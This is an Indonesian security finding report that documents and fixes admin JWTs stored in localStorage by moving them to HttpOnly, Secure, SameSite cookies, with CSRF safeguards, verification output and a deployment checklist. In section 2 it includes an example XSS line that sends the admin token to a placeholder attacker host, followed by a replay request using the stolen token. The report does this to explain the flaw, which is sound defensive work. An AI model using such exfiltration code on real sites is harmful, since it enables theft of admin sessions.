# H-2 (HIGH) — Token admin disimpan di localStorage dan berlaku 7 hari

Status: **Fixed**

File terdampak:

- Backend: `src/lib/sessionCookie.js`, `src/middleware/auth.js`,
  `src/controllers/authController.js`
- Frontend: `src/lib/auth.ts`, `src/lib/admin.ts`, `src/routes/login.tsx`,
  `src/routes/change-password.tsx`, `src/routes/dashboard.tsx`

## 1. Masalah

Sebelum perbaikan, endpoint login mengembalikan JWT sesi di response JSON.
Frontend kemudian menyimpan JWT tersebut ke `localStorage`:

```ts
const TOKEN_KEY = "crisbar_token";

export function saveAuth(token: string, user: AuthUser) {
  localStorage.setItem(TOKEN_KEY, token);
  localStorage.setItem(USER_KEY, JSON.stringify(user));
}

export function getToken() {
  return localStorage.getItem(TOKEN_KEY);
}
```

Setiap request admin membaca token tersebut dan memasukkannya ke header:

```http
Authorization: Bearer <JWT>
```

`localStorage` dapat dibaca oleh semua JavaScript yang berjalan pada origin
frontend. Jika terjadi XSS pada halaman mana pun dalam origin yang sama, skrip
yang tersuntik dapat mengambil JWT admin dan mengirimkannya ke server penyerang.
Token yang sudah diekstrak dapat dipakai dari perangkat lain sampai sesi
kedaluwarsa atau dicabut di database.

Risikonya tinggi karena:

- sesi default berlaku selama 7 hari (`JWT_EXPIRES_IN=7d`);
- akun admin/marketing memiliki akses elevated;
- token dapat dipakai ulang di luar browser korban;
- Content Security Policy masih dinonaktifkan pada backend untuk kompatibilitas
  halaman Swagger, sehingga pertahanan berlapis terhadap XSS belum lengkap.

## 2. Kondisi sebelum perbaikan

### Response login

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": "7d",
  "user": {
    "id": 1,
    "role": "admin"
  }
}
```

### Penyimpanan browser

```text
localStorage["crisbar_token"] = "eyJhbGciOiJIUzI1NiIs..."
localStorage["crisbar_user"]  = "{...}"
```

Contoh dampak XSS sebelum perbaikan:

```js
fetch("https://server-penyerang.example/collect", {
  method: "POST",
  body: localStorage.getItem("crisbar_token"),
});
```

Token hasil pencurian bisa langsung digunakan:

```http
GET /api/admin/loyalty/summary HTTP/1.1
Authorization: Bearer <token-yang-dicuri>
```

## 3. Perbaikan

### 3.1 Token sesi dipindahkan ke cookie HttpOnly

Backend membuat cookie sesi melalui `src/lib/sessionCookie.js`. Konfigurasi
default cookie:

| Atribut | Nilai | Tujuan |
|---|---|---|
| `HttpOnly` | `true` | Token tidak dapat dibaca melalui `document.cookie` atau JavaScript frontend |
| `Secure` | `true` di production | Cookie hanya dikirim melalui HTTPS |
| `SameSite` | `Strict` | Membatasi pengiriman cookie pada request lintas-site |
| `Path` | `/api` | Cookie hanya dikirim ke endpoint API |
| `Expires` | expiry JWT | Masa cookie dan sesi server berakhir pada waktu yang sama |

Nama default cookie adalah `crisbar_session`. Nama tersebut dapat diubah lewat
`SESSION_COOKIE_NAME`.

### 3.2 Response login tidak lagi mengekspos token

Setelah password berhasil diverifikasi dan baris `Session` dibuat, backend
memasang cookie lalu hanya mengembalikan metadata sesi dan user:

```http
HTTP/1.1 200 OK
Set-Cookie: crisbar_session=<JWT>; Path=/api; Expires=<waktu-expiry>; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json

{
  "expiresIn": "7d",
  "user": {
    "id": 1,
    "role": "admin"
  }
}
```

Tidak ada lagi properti `token` di body response.

### 3.3 Frontend menggunakan credential cookie

Request browser yang membutuhkan autentikasi kini memakai:

```ts
fetch(apiUrl("/admin/..."), {
  credentials: "include",
});
```

Frontend tidak lagi:

- mengekspor atau memanggil `getToken()`;
- membentuk header `Authorization: Bearer ...`;
- menyimpan token baru di `localStorage`;
- mensyaratkan keberadaan token JavaScript sebelum memanggil API.

Data `crisbar_user` tetap berada di `localStorage` untuk kebutuhan tampilan UI.
Data ini bukan credential dan tidak dapat digunakan untuk melewati autentikasi
atau pemeriksaan role backend. Backend tetap menjadi sumber kebenaran untuk
sesi dan otorisasi.

### 3.4 Migrasi token browser lama

Saat modul autentikasi frontend dimuat, key lama langsung dihapus:

```ts
localStorage.removeItem("crisbar_token");
```

Pengguna yang masih memakai sesi localStorage versi lama harus login ulang.
Ini disengaja agar credential lama tidak terus dapat dibaca JavaScript selama
sisa masa berlaku 7 hari.

Baris sesi lama di database tidak otomatis dihapus oleh frontend karena token
tidak lagi dikirim untuk proses migrasi. Untuk deployment dengan indikasi token
pernah bocor, operator harus mencabut sesi lama di database atau menggunakan
mekanisme logout semua sesi sebelum/ketika deployment.

### 3.5 Middleware menerima cookie dengan kompatibilitas terbatas

Middleware autentikasi memprioritaskan cookie `crisbar_session`. Bearer token
masih diterima sebagai fallback untuk tooling API, Swagger, job, atau integrasi
server-to-server yang tidak menggunakan browser cookie jar.

Urutan pemilihan credential:

```text
Cookie HttpOnly tersedia -> gunakan cookie
Cookie tidak tersedia    -> gunakan Bearer token bila ada
Keduanya tidak tersedia  -> 401 Unauthorized
```

Fallback Bearer tidak membuat token tersedia bagi frontend karena response
login browser tidak lagi mengembalikan token.

### 3.6 Logout mencabut server session dan cookie

`POST /api/logout` menghapus sesi perangkat aktif dari database dan mengirim
cookie kedaluwarsa. `POST /api/logout-all` menghapus semua sesi milik user dan
juga membersihkan cookie browser saat ini.

Jika JWT tidak valid, kedaluwarsa, atau tidak ditemukan di tabel `Session`,
middleware turut membersihkan cookie yang tidak valid.

## 4. Perlindungan CSRF

Perpindahan credential ke cookie mengharuskan risiko CSRF diperhatikan.
Perlindungan yang digunakan pada implementasi ini:

- cookie default memakai `SameSite=Strict`;
- backend menolak request yang memiliki header `Origin` tetapi origin tersebut
  tidak terdaftar pada `FRONTEND_URL`/`CORS_ORIGINS`;
- CORS hanya mengizinkan origin yang dikenal dan memakai
  `credentials: true`;
- endpoint mutasi memakai JSON sehingga form HTML lintas-origin biasa tidak
  dapat membentuk payload setara tanpa melewati pemeriksaan CORS/origin.

Jika frontend dan API berada pada site yang benar-benar berbeda, konfigurasi
deployment dapat menggunakan:

```env
SESSION_COOKIE_SAME_SITE=none
FRONTEND_URL=https://frontend.example
```

Mode `none` otomatis memaksa atribut `Secure`. Origin frontend harus tetap
masuk allowlist; jangan memakai wildcard CORS bersama credential cookie.

## 5. Output setelah perbaikan

### Login berhasil

```text
Response body:
  expiresIn: "7d"
  user: { id, role, ... }
  token: TIDAK ADA

Browser cookie:
  crisbar_session=<nilai tidak dapat dibaca JavaScript>

Browser localStorage:
  crisbar_token: TIDAK ADA
  crisbar_user: data tampilan user
```

### Request admin

```http
GET /api/admin/loyalty/summary HTTP/1.1
Cookie: crisbar_session=<JWT>
```

Header cookie ditambahkan browser secara otomatis. Kode frontend tidak pernah
membaca nilai JWT.

### Logout

```http
POST /api/logout HTTP/1.1
Cookie: crisbar_session=<JWT>

HTTP/1.1 200 OK
Set-Cookie: crisbar_session=; Path=/api; Expires=<tanggal lampau>; HttpOnly; Secure; SameSite=Strict

{ "message": "Berhasil keluar" }
```

## 6. Perbandingan sebelum dan sesudah

| Aspek | Sebelum | Sesudah |
|---|---|---|
| Lokasi credential browser | `localStorage` | Cookie `HttpOnly` |
| Dapat dibaca JavaScript/XSS | Ya | Tidak |
| Token di response JSON | Ya | Tidak |
| Pengiriman credential | Header Bearer dibuat frontend | Cookie otomatis oleh browser |
| HTTPS production | Tidak dipaksakan oleh storage | `Secure` aktif |
| Pembatasan cross-site | Tidak relevan untuk Bearer | `SameSite=Strict` default |
| Logout | Bearer dikirim lalu state lokal dihapus | Sesi database dan cookie dicabut |
| Token versi lama | Bertahan sampai 7 hari | Dihapus saat aplikasi dimuat |
| Klien non-browser | Bearer | Bearer fallback tetap didukung |

## 7. Verifikasi

Verifikasi yang telah dijalankan setelah perubahan:

### Lint frontend terfokus

```text
npx eslint src/lib/auth.ts src/lib/admin.ts src/routes/login.tsx \
  src/routes/change-password.tsx src/routes/dashboard.tsx

Exit code: 0
```

### Build produksi frontend

```text
npm run build

Client build: 2510 modules transformed
SSR build: 96 modules transformed
Nitro build: 2521 modules transformed
Exit code: 0
```

### Pemeriksaan sintaks backend

```text
node --check src/lib/sessionCookie.js
node --check src/middleware/auth.js
node --check src/controllers/authController.js
node --check src/index.js

Exit code: 0
```

### Pemeriksaan statis credential frontend

Pencarian pada seluruh `crisbro-frontend/src` memastikan tidak ada lagi:

- pemanggilan `getToken`;
- konstruksi `Authorization: Bearer`;
- `localStorage.setItem` untuk token.

Satu-satunya referensi `crisbar_token` yang tersisa adalah konstanta migrasi
untuk menghapus token lama.

Pengujian integrasi login terhadap database/deployment aktif tidak dilakukan
dalam perbaikan ini. Pemeriksaan cookie aktual pada environment staging tetap
disarankan sebelum production rollout.

## 8. Pemetaan ke rekomendasi issue

| Rekomendasi | Implementasi |
|---|---|
| Simpan token pada cookie `HttpOnly` | `setSessionCookie()` memasang credential sebagai cookie yang tidak dapat dibaca JavaScript |
| Aktifkan `Secure` | Otomatis aktif ketika `NODE_ENV=production`; selalu aktif untuk `SameSite=None` |
| Gunakan `SameSite` | Default `Strict`, dapat dikonfigurasi secara eksplisit untuk deployment cross-site |
| Jangan ekspos token ke frontend | Properti `token` dihapus dari response login dan seluruh penggunaan Bearer frontend dihapus |
| Tangani token localStorage lama | Dihapus segera saat modul auth dimuat; pengguna diminta login ulang |
| Kurangi risiko CSRF | `SameSite`, allowlist Origin, CORS credential terbatas, dan JSON request |

## 9. Yang tidak berubah dan risiko residual

- Masa berlaku sesi server tetap mengikuti `JWT_EXPIRES_IN` dan default-nya
  masih 7 hari. Perubahan utama menghilangkan kemampuan XSS untuk
  **mengekstrak** credential; kebijakan expiry dapat diperpendek secara
  terpisah bila diperlukan.
- XSS yang aktif masih dapat mengirim request dari browser korban selama sesi
  terbuka, tetapi tidak dapat membaca token untuk mengambil alih sesi dari
  perangkat lain. Karena itu perbaikan CSP pada temuan L-2 tetap penting.
- Cookie tidak menggantikan pemeriksaan role. Semua endpoint admin tetap harus
  memakai middleware `auth` dan `requireRole` yang sesuai.
- Tidak ada perubahan skema database atau format tabel `Session`.
- Bearer fallback sengaja dipertahankan untuk klien non-browser. Token untuk
  klien tersebut harus disimpan memakai secret store yang sesuai, bukan
  `localStorage` browser.

## 10. Checklist deployment

1. Pastikan production menggunakan HTTPS dan `NODE_ENV=production`.
2. Pastikan `FRONTEND_URL`/`CORS_ORIGINS` hanya berisi origin tepercaya.
3. Gunakan default `SESSION_COOKIE_SAME_SITE=strict` bila frontend dan API
   berada pada site yang sama.
4. Bila benar-benar cross-site, set `SESSION_COOKIE_SAME_SITE=none` dan uji
   cookie pada browser target.
5. Deploy backend lebih dahulu atau bersamaan dengan frontend agar request
   cookie langsung dapat diterima.
6. Uji login, refresh halaman, akses admin, logout, dan logout semua perangkat
   pada staging.
7. Pertimbangkan pencabutan seluruh sesi lama saat rollout jika ada dugaan
   token localStorage sebelumnya telah terekspos.
